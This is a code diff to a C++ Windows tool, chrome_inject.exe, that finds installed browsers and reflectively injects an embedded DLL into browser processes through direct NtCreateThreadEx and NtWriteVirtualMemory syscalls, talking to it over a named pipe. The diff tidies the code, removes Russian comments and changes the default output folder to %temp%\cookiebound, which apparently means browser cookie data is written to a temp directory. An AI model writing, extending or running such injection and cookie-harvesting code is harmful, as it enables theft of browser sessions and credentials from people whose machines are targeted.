@@ -148,7 +148,7 @@ namespace Injector
             std::cout << "Usage: chrome_inject.exe [-v|--verbose] [-o|--output-path <path>] [-h|--help]\n";
             std::cout << "Options:\n";
             std::cout << "  -v, --verbose        Enable verbose output\n";
-            std::cout << "  -o, --output-path    Specify output directory\n";
+            std::cout << "  -o, --output-path    Specify output directory (default: %temp%\\cookiebound)\n";
             std::cout << "  -h, --help           Display this help message\n";
             SetConsoleTextAttribute(hConsole, FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE);
         }
@@ -193,9 +193,7 @@ namespace Injector
             DWORD dwSize = SizeofResource(hModule, hResInfo);
 
             if (pData == NULL || dwSize == 0)
-            {
                 return std::nullopt;
-            }
 
             UI::LogDebug("Successfully loaded embedded resource '" + WStringToUtf8(lpName) + "'. Size: " + std::to_string(dwSize) + " bytes.");
             return EmbeddedResource{pData, dwSize};
@@ -303,13 +301,9 @@ namespace Injector
         {
             USHORT targetArch = 0;
             if (!GetProcessArchitecture(hProc, targetArch))
-            {
                 return false;
-            }
             if (targetArch != MyArch)
-            {
                 return false;
-            }
             UI::LogDebug("Architecture match: Injector=" + std::string(ArchName(MyArch)) + ", Target=" + std::string(ArchName(targetArch)));
             return true;
         }
@@ -447,9 +441,7 @@ namespace Injector
         {
             DWORD rdiOffset = GetReflectiveLoaderFileOffset(dllBuffer.data(), targetArch);
             if (rdiOffset == 0)
-            {
                 return false;
-            }
             UI::LogDebug("RDI: ReflectiveLoader file offset: " + Utils::PtrToHexStr((void *)(uintptr_t)rdiOffset));
 
             LPVOID remoteMem = nullptr;
@@ -501,9 +493,7 @@ namespace Injector
             HANDLE hRemoteThread = nullptr;
             status = NtCreateThreadEx_syscall(&hRemoteThread, THREAD_ALL_ACCESS, nullptr, proc, (LPTHREAD_START_ROUTINE)remoteLoaderAddr, lpDllParameter, 0, 0, 0, 0, nullptr);
             if (!NT_SUCCESS(status))
-            {
                 return false;
-            }
             HandleGuard remoteThreadGuard(hRemoteThread);
 
             UI::LogDebug("RDI: Waiting for remote ReflectiveLoader thread...");
@@ -525,9 +515,7 @@ namespace Injector
                                                 PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT,
                                                 1, 4096, 4096, 0, nullptr));
             if (!m_pipeHandle)
-            {
                 return false;
-            }
             UI::LogDebug("Named pipe server created: " + m_pipeNameUtf8);
             return true;
         }
@@ -536,9 +524,7 @@ namespace Injector
         {
             UI::LogDebug("Waiting for DLL to connect to named pipe...");
             if (!ConnectNamedPipe(m_pipeHandle.get(), nullptr) && GetLastError() != ERROR_PIPE_CONNECTED)
-            {
                 return false;
-            }
             UI::LogDebug("DLL connected to named pipe.");
             return true;
         }
@@ -618,9 +604,7 @@ namespace Injector
             DWORD bytesWritten = 0;
             if (!WriteFile(m_pipeHandle.get(), msg.c_str(), static_cast<DWORD>(msg.length() + 1), &bytesWritten, nullptr) ||
                 bytesWritten != (msg.length() + 1))
-            {
                 return false;
-            }
             UI::LogDebug("Sent message to pipe: " + msg);
             return true;
         }
@@ -667,7 +651,6 @@ namespace Injector
         HandleGuard m_pipeHandle;
     };
 
-    // NEW: Функция для определения установленных браузеров
     std::vector<Configuration> DetectInstalledBrowsers()
     {
         std::vector<Configuration> configs;
@@ -697,7 +680,6 @@ namespace Injector
         return configs;
     }
 
-    // MODIFIED: Обновлена функция ParseArguments
     std::optional<std::vector<Configuration>> ParseArguments(int argc, wchar_t *argv[])
     {
         Configuration baseConfig;
@@ -722,7 +704,6 @@ namespace Injector
             }
         }
 
-        // Получаем список установленных браузеров
         std::vector<Configuration> configs = DetectInstalledBrowsers();
         if (configs.empty())
         {
@@ -730,17 +711,20 @@ namespace Injector
             return std::nullopt;
         }
 
-        // Применяем параметры verbose и outputPath ко всем конфигурациям
+        // Set default output path to %temp%\cookiebound
+        wchar_t tempPath[MAX_PATH];
+        GetTempPathW(MAX_PATH, tempPath);
+        fs::path defaultOutputPath = fs::path(tempPath) / L"cookiebound";
+
         for (auto& config : configs)
         {
             config.verbose = baseConfig.verbose;
-            config.outputPath = customOutputPath.empty() ? fs::current_path() / "output" : fs::absolute(customOutputPath);
+            config.outputPath = customOutputPath.empty() ? defaultOutputPath : fs::absolute(customOutputPath);
         }
 
         return configs;
     }
 
-    // MODIFIED: Обновлена функция Run для обработки нескольких браузеров и диагностики ошибок
     int Run(int argc, wchar_t *argv[])
     {
         UI::DisplayBanner();
@@ -865,7 +849,6 @@ namespace Injector
             };
             std::unique_ptr<void, decltype(remoteMemFreer)> remoteMemGuard(remotePipeNameAddr, remoteMemFreer);
 
-            // MODIFIED: Добавлено подробное логирование параметров NtWriteVirtualMemory
             UI::LogDebug("Calling NtWriteVirtualMemory_syscall for pipe name at " + Utils::PtrToHexStr(remotePipeNameAddr) + ", size: " + std::to_string(pipeNameSize));
             SIZE_T bytesWritten = 0;
             NTSTATUS statusWrite = NtWriteVirtualMemory_syscall(
@@ -931,6 +914,6 @@ namespace Injector
 
 int wmain(int argc, wchar_t *argv[])
 {
-        Sleep(3000); 
+    Sleep(3000); 
     return Injector::Run(argc, argv);
 }
